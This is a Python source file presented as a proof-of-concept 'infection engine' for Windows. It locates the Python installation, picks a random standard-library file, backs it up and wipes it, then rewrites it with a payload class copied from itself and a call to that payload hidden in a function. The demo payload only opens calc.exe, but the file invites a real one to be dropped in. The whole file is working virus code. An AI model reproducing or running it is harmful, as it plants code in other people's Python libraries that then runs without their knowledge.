# Python Infection Engine (PIE)
# by Dorian Warboys / Red Skäl
# http://github.com/redskal
#
# A proof-of-concept Python-based infection engine for
# Python scripts under Windows.
#
# We're going to target Python library files. We will
# install ourselves parasitically.
#
# Attempting to use mostly standard libraries.
#
# NOTE:
#   'snekhunt' was built up as I needed new features. As a
#   result it is incredibly messy and could do with a lot
#   of optimisation. I will get around to that at some
#   stage.
#
import os, sys, string, ctypes, subprocess, random, shutil
from datetime import datetime

# hunt out the snek
class snekhunt:
    
    # Beast mode: activate
    def __init__(self):
        self.pyPath = ''
        self.pathEnv = os.getenv('path')
        self.pyPaths = self.pathEnv.split(';')
        self.ourPath = os.getcwd()
        
        # parse PATH env for python directory
        for path in self.pyPaths:
            try: # find() can throw exceptions and cause traceback
                # find Python dir but avoid Scripts dir
                if (path.lower().find('python') >= 0 and \
                    path.lower().find('scripts') == -1):
                    print(" DEBUG: found Python dir: ", path)
                    self.pyPath = path
                    break
            except Exception:
                return
        print(" DEBUG: PyPath = ", self.pyPath)
    
    # get drives.
    # returns better results than using GetLogicalDrives() winapi
    def getDrives(self):
        self.drives = []
        
        for letter in string.ascii_uppercase:
            if os.path.exists('%s:' % letter):
                drives.append('%s:\\' % letter)
                
        return drives
    
    # recursively scan directories of given path
    def scanDirs(self, path):
        try:
            for entry in os.scandir(path):
                if entry.is_dir(follow_symlinks=False):
                    yield from self.scanDirs(entry.path)
        except:
            return
    
    # Hunt out the install directory if not in PATH env var
    def huntInstallDir(self):
        self.envVars = [ 'PUBLIC', 'ProgramFiles', 'ProgramFiles(x86)',
                         'SystemDrive', 'SystemRoot', 'USERPROFILE' ]
        
        for path in self.envVars:
            # extract path...
            for d in self.scanDirs(os.getenv(path)):
                if d.endswith('Python') or d.endswith('Python\\'):
                    self.pyPath = d
                    break
        
    # Find a default library
    # Build an array of files, pick randomly.
    def findLibrary(self, targetLibrary=''):
    
        print(" DEBUG: Inside findLibrary()")
        self.libraryFiles = []
        self.target = ''
        
        # check if we've been fed a library name
        if targetLibrary != '':
            self.target = targetLibrary
        print(" DEBUG: targetLibrary = ", targetLibrary)
        
        # if constructor didn't find Python dir we hunt down the snek
        if self.pyPath == '':
            self.huntInstallDir()
        
        # traverse to library dir and put it in a variable
        try:
            os.chdir(self.pyPath + "\\Lib")
            self.pyLibPath = os.getcwd()
        except:
            print(" DEBUG: Failed chrdir() to Lib directory")
            return ''
        
        print(" DEBUG: PyLibPath = ", self.pyLibPath)
        # scan library folder for python files if target not set
        if self.target == '':
            with os.scandir(self.pyLibPath) as it:
                for entry in it:
                    if entry.name.endswith('.py'):
                        self.libraryFiles.append(self.pyLibPath + \
                                                 '\\' + entry.name)
            random.seed()
            self.prng = random.randrange(0, (len(self.libraryFiles) - 1))
            self.target = self.libraryFiles[self.prng]
        
        print(" DEBUG: findLibrary returning: ", self.target)
        return self.target
    
    # Execute Order 66...
    def order66(self, filename=''):
        if filename != '':
            self.infect = pie(filename, self.ourPath)
        else:
            self.infect = pie(self.findLibrary(), self.ourPath)
        
        self.infect.murderaliseThem()

# infection routines
class pie:

    # and so it begins
    def __init__(self, filename, ourPath):
        self.targetScript = filename
        self.requiredImports = [      # this can be reduced to what is needed
                          'os',       # for the payload class.
                          'sys',
                          'string',
                          'ctypes',
                          'subprocess',
                          'random',
                          'shutil',
                          'datetime'
                          ]
        self.hostContent = []
        self.hostIndex = 0
        self.importStart = 0
        self.importFinish = 0
        self.existingImports = {}
        self.listInits = []
        self.listInjectables = []
        self.payloadLines = []
        self.pieDirectory = ourPath
        print(" PIE init - filename = ", filename)
    
    def readHostContent(self, filename):
        with open(filename.replace('\\', '/'), 'r') as fd:
            self.hostContent = fd.readlines()
        print(" readHostContent length: ", len(self.hostContent))
    
    def writeLineToHost(self, filename, content):
        with open(filename.replace('\\', '/'), 'a+') as fd:
            fd.write(content)
    
    def backupWipeHost(self, filename):
        shutil.copyfile(filename, filename + '.bak')
        try:
            os.remove(filename)
        except:
            print(" DEBUG: wipe failed")
        print(" Wiped file: ", filename.replace('\\', '/'))
    
    def copyPayload(self, filename, startIndex, endIndex):
        with open(self.pieDirectory.replace('\\', '/') + '/' + \
                  __file__.replace('\\', '/'), 'r') as fd:
            for i, line in enumerate(fd, start=1):
                if i >= startIndex and i <= endIndex:
                    self.writeLineToHost(filename, line)
    
    # in the immortal words of Tum-tum: "Let's murderalise 'em!"
    def murderaliseThem(self):        
        # read host file, back up and wipe contents
        self.readHostContent(self.targetScript)
        self.backupWipeHost(self.targetScript)
        isComment = False
        
        # write up to end of import section...
        for i, line in enumerate(self.hostContent):
        
            # inside multi-line comments?
            if ("\'\'\'" in line or '"""' in line):
                if isComment is False:
                    # check for dicks using multi-lines on single lines
                    if (line[line.find('"""')+3:].find('"""') < 0 or \
                        line[line.find('\'\'\'')+3:].find('\'\'\'') < 0):
                        isComment = True
                    else:
                        print(f" DEBUG: ML on SL: {i}: {line}")
                else:
                    isComment = False
            
            # parse and write line
            if 'import' not in line.lower():
                # try to mitigate scripts with no imports...
                if (line.lower().find('class') >= 0 or \
                    line.lower().find('def ') >= 0):
                    if (self.importStart > 0 and isComment is False):
                        break
                # if imports started we reached end of imports
                elif (
                  self.importStart > 0 and \
                  isComment is False and \
                  self.hostContent[i+1].split(' ')[0].lower() != 'import' and \
                  self.hostContent[i+1].split(' ')[0].lower() != 'from'
                    ):
                    # mark end of imports, write line and break 'for' loop
                    self.importFinish = i - 1
                    self.hostIndex = i
                    #self.writeLineToHost(self.targetScript, line)
                    break
                
                self.hostIndex = i
                self.writeLineToHost(self.targetScript, line)
            # create dict of host imports and how they're imported
            elif 'import' in line.lower():
                # if not in ML comment add import to dict, start++
                if isComment is False:
                    if self.importStart == 0:
                        self.importStart = i
                    self.existingImports[line.split()[1]] = line.split()[0]
                self.hostIndex = i
                self.writeLineToHost(self.targetScript, line)
        
        print(" DEBUG: sizeof(existingImports) = ", len(self.existingImports))
        print(" DEBUG: hostIndex = ", self.hostIndex)
        
        # check imports against host dict and add missing
        for name in self.requiredImports:
            # we want datetime imported differently...
            if name == 'datetime':
                if name not in self.existingImports:
                    self.writeLineToHost(self.targetScript, \
                                         'from datetime import datetime\n')
            else:
                if name not in self.existingImports:
                    self.writeLineToHost(self.targetScript, 'import ' + \
                                         name + '\n')
        
        # locate possible entry points and payload 
        # injection points
        for i, line in enumerate(self.hostContent):
            if i >= self.hostIndex:
                # class constructor or basic function...
                if line.lower().find('def __init__') > 0:
                    self.listInits.append(i)
                elif line.lower().find('def') == 0:
                    self.listInits.append(i)
                    self.listInjectables.append(i)
                elif line.lower().find('class') == 0:
                    self.listInjectables.append(i)
        
        # select entry point and injection points
        entryPoint = self.listInits[random.randrange(len(self.listInits))]
        print(" DEBUG: entryPoint = ", entryPoint)

        injectIndex = len(self.listInjectables) - 1
        injectPoint = self.hostIndex
        print(" DEBUG: injectIndex = ", injectIndex)
        print(" DEBUG: injectables = ", self.listInjectables)
        while (injectIndex >= 0):
            if self.listInjectables[injectIndex] < entryPoint:
                injectPoint = self.listInjectables[injectIndex]
                break
            injectIndex -= 1
        print(" DEBUG: injectPoint = ", injectPoint)
        
        # write up to entryPoint including payload dump
        while (self.hostIndex <= entryPoint):
            if self.hostIndex == injectPoint:
                self.copyPayload(self.targetScript, 309, 317)
                
            self.writeLineToHost(self.targetScript, \
                                 self.hostContent[self.hostIndex])
            self.hostIndex += 1
        
        # calculate indent and write payload caller
        spacesNeeded = 0
        for character in self.hostContent[entryPoint]:
            if character == ' ':
                spacesNeeded += 1
            else:
                # don't count past words
                break
        spacesNeeded += 4
        
        payloadString = (' ' * spacesNeeded + 'snoochieBoochies = payload()\n')
        self.writeLineToHost(self.targetScript, payloadString)
        
        while (self.hostIndex < len(self.hostContent)):
            self.writeLineToHost(self.targetScript, \
                                 self.hostContent[self.hostIndex])
            self.hostIndex += 1
        
        

#######################################################################
#                                                                     #
# Load up your ub3rl33t payload class here.....                       #
#                                                                     #
#######################################################################

### PAYLOAD_START
class payload:

    # Where the wild things are...
    
    def __init__(self):
        subprocess.run('calc.exe')

### PAYLOAD_STOP


# if run as a script we infect
if __name__ == "__main__":
    doit = snekhunt()
    doit.order66()